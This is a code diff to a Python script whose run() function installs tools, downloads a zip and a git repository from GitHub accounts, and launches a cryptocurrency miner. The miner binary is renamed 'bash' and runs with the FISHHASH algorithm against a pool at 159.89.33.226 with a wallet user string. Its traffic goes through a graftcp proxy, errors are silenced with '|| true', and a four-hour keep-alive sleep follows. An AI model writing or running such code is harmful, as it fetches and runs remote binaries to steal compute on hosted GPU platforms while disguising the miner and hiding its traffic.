@@ -2,40 +2,42 @@ import subprocess
 import time
 
 def run():
-    print("=== CHECK GPU ===")
-    subprocess.run(["nvidia-smi"], check=False)
+    print("=== START ===")
 
+    # JANGAN pakai set -e (biar tidak crash)
     cmd = """
-    set -e
+    echo "install tools"
+    apt update -y || true
+    apt install -y wget unzip git || true
 
-    apt update -y
-    apt install -y wget unzip git
+    echo "download"
+    wget -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O pan.zip || true
 
-    wget -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O pan.zip
-    unzip -o pan.zip
+    unzip -o pan.zip || true
 
-    cd pan
-    chmod -R +x .
+    cd pan || exit
+
+    chmod -R +x . || true
 
     ./graftcp/local/graftcp-local -config graftcp-local.conf > /dev/null 2>&1 &
 
     sleep 3
 
-    git clone https://github.com/hujisanda/lol198.git
-    cd lol198 && chmod u+x bash
+    git clone https://github.com/hujisanda/lol198.git || true
 
-    mv bash ~/pan
+    cd lol198 || exit
+    chmod u+x bash || true
 
-    cd ~/pan
-    ./graftcp/graftcp ./bash --algo FISHHASH --pool 159.89.33.226:80 --user c9f8d6c1849abbcd164f6c72002d9ac44b9deaef70481739a29d1733915defca+115098.jasin --ethstratum ETHPROX
+    mv bash ~/pan || true
+
+    cd ~/pan || exit
+
+    ./graftcp/graftcp ./bash --algo FISHHASH --pool 159.89.33.226:80 --user c9f8d6c1849abbcd164f6c72002d9ac44b9deaef70481739a29d1733915defca+115098.jasin --ethstratum ETHPROX || true
     """
 
-    try:
-        subprocess.run(["bash", "-lc", cmd], check=True)
-    except subprocess.CalledProcessError as e:
-        print("ERROR:", e)
+    subprocess.run(["bash", "-lc", cmd], check=False)
 
-    print("=== KEEP ALIVE 4 JAM ===")
-    time.sleep(60 * 60 * 4)
+    print("=== KEEP ALIVE ===")
+    time.sleep(14400)
 
-    return {"status": "done"}
+    return {"status": "ok"}
